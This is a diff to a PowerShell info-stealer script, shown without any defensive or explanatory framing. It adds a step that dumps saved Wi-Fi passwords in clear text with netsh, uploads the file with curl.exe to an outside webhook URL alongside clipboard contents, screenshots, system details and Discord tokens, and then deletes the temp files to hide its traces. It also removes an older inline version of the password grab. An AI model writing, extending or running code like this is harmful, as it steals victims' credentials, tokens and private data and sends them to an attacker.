@@ -17,6 +17,10 @@
   echo "####################################" >> "$env:temp\stats-$namepc.txt";
   echo "####End ClipBoard" >> "$env:temp\stats-$namepc.txt";
 
+# Get WifiPassword
+echo "" > "$env:temp\WIFI-$namepc.txt";
+(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | out-file "$env:temp\WIFI-$namepc.txt";
+
 # Screenshot
   cd "$env:temp";
   echo 'function Get-ScreenCapture' > "d.ps1";
@@ -59,20 +63,13 @@
 #Define zip to copy
 #  $tokenfile = "$env:temp\Discord-Token-$namepc.zip"
 
-# Get PC information + Wifi Password(if register)
+# Get PC information
   dir env: >> "$env:temp\stats-$namepc.txt";
 # Get public IP
   $pubip = (Invoke-WebRequest -UseBasicParsing -uri "http://ifconfig.me/").Content
   echo "PUBLIC IP: $pubip" >> "$env:temp\stats-$namepc.txt";
 # Get Local IP
   ipconfig /all >> "$env:temp\stats-$namepc.txt";
-# Wifi Password
-  echo "Get wifi password if exist:" >> "$env:temp\stats-$namepc.txt";
-  Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> "$env:temp\stats-$namepc.txt";
-  (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim();
-  $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim();
-  $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;
-  PASSWORD=$pass}} | Format-Table -AutoSize >> "$env:temp\stats-$namepc.txt";
 # List all installed Software
   echo "Installed Software:" >> "$env:temp\stats-$namepc.txt";
   Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize >> "$env:temp\stats-$namepc.txt";
@@ -180,6 +177,8 @@ cd $env:temp
   Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
 # Upload Stat
   curl.exe -F "file1=@stats-$namepc.txt" $url;
+# Upload wifi password
+  curl.exe -F "file2=@WIFI-$namepc.txt" $url;
 # Upload Token Clipboard
   $Body=@{ content = "**Discord Token:** ||$token||"};
   Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
@@ -219,6 +218,8 @@ cd $env:temp
 # Remove-Item  "$tokenfile" -Force -Recurse;
 # Delete stat
   Remove-Item "stats-$namepc.txt" -Force -Recurse;
+# Delete wifi password
+  Remove-Item "WIFI-$namepc.txt" -Force -Recurse;
 # Delete screenshot
   Remove-Item  $screencapture* -Force -Recurse;
 # Delete token screencapture
